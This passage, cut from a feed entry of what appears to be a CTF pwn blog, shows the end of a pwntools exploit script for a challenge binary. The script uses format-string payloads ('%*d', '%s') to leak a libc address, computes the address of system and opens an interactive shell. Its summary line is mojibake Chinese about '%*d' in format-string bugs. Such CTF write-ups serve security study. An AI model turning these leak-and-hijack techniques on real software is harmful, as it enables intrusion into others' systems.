class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x1100)&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%*d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 3&quot;</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pr(<span class="built_in">hex</span>(libc))</span><br><span class="line">system=libc-<span class="number">0x19a6f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] process 4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2. call\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fmtä¸­%*dçš„åˆ©ç”¨</summary>
    
    
    
    <category term="Fmt" scheme="https://www.thir0th.xyz/categories/Fmt/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
</feed>
